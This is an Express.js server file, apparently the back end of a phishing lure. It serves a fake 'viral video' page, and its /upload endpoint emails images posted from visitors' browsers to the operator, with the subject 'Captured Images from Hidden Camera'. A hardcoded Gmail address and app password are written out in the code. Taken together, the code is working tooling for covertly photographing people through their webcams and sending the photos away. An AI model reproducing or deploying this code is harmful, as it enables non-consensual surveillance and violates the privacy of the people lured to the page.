const express = require("express");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));
app.use(express.static("public"));

// ইউজারের ভিডিও প্লে পেজ
app.get("/video", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});


app.get("/ridhi-viral-video", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "/Pages/Ridhi viral video.html"));
});






// ইমেজ রিসিভ + ইমেইল
app.post("/upload", async (req, res) => {
  try {
    const { images } = req.body;

    if (!images || images.length === 0) {
      return res.status(400).send("❌ No images received.");
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "sojib01943075658@gmail.com",
        pass: "eqws loxu bzbz imbx",
      },
    });

    const attachments = images.map((img, i) => ({
      filename: `image${i + 1}.jpg`,
      content: img.split("base64,")[1],
      encoding: "base64",
    }));

    await transporter.sendMail({
      from: "sojib01943075658@gmail.com",
      to: "rajib01943075658@gmail.com",
      subject: "📸 Captured Images from Hidden Camera",
      text: "Here are the 15 captured images.",
      attachments,
    });

console.log("✅ Images sent via email successfully." )

    res.json({ message: "✅ Images sent via email successfully." });
  } catch (err) {
    console.error("Email error:", err);
    res.status(500).send("❌ Server error");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
  console.log(`🎬 Video page: http://localhost:${PORT}/video`);
});